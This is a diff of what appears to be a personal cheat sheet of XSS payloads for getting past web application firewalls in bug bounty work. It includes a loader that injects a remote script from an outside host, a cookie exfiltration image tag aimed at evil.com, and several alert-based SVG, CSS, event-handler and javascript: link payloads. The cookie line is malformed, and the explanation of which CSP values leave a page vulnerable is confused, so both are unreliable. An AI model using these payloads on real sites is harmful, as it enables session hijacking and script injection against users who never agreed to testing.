@@ -9,34 +9,39 @@ Some collection of xss payloads that worked for me to bypass wafs while doing bb
 <img src=x onerror="var script = document.createElement('script'); script.src = 'https://eternal.h4ck.me/xss.js'; document.head.appendChild(script);">
 ```
 
-2. **Bypassing `onerror` Filter with `srcdoc`:**
-
-```html
-<iframe srcdoc="<script>alert('XSS')</script>">
-```
-
-3. **Data Exfiltration through Image Source (Cross-Domain):**
+2. **Data Exfiltration through Image Source (when CSP is disabled):**
 
 ```html
 <img src="https://evil.com/?data=" + encodeURIComponent(document.cookie)">
 ```
 
-4. **CSS-Based XSS:**
+Vulnerable when
+
+- Absence of Content-Security-Policy header in the response
+- Presence of Content-Security-Policy header with a value of `default-src` or `none`
+
+3. **CSS-Based XSS:**
 
 ```css
 body { background-image: url('javascript:alert("XSS")'); }
 ```
 
-5. **SVG XSS (Cross-Site Scripting using SVG):**
+4. **SVG XSS:**
 
 ```html
 <svg/onload=alert(document.domain)>
 ```
 
-7. **Event Handlers to Execute Payload:**
+5. **Event Handlers to Execute Payload:**
 
 ```html
 <button onclick="alert('XSS')">Click Me</button>
+```
+
+6. **JavaScript Protocol Handler:**
+   
+```html
+<a href="javascript:alert('XSS')">Click Me</a>
 ```
 
 ### Cookie Stealer Example:
